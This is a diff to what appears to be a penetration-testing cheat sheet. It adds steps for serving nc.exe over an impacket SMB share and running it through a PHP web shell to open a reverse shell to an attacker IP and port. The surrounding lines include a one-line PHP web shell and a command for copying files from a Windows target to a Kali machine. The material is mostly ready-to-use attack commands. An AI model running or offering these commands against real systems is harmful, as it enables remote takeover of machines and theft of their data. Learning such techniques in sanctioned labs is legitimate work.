@@ -222,6 +222,19 @@ copy $FILEPATH\file \\$LOST\ShareName
 File should be copied from remote Windows target to local Kali machine at $(pwd)
 
 
+Trick: if accquired a webshell, aka have code exec, however, powershell commands don't seem to work and the target machine doesn't have nc. You can upload nc.exe via creating a SMB Share.\
+On local kali machine, create an SMB share pointing to current directory:
+```
+sudo impacket-smbserver ShareName $(pwd)
+```
+
+Connect and run the executable via the newly create SMB Share:
+```
+....php?cmd=\\$LHOST\$SHARENAME\nc.exe -e cmd.exe $LHOST $LPORT
+....php?cmd=\\10.10.14.67\Jake\nc.exe -e cmd.exe 10.10.14.67 9000
+```
+
+
 ## Simple PHP web shell
 ```
 <?php system($_REQUEST['cmd']); ?>
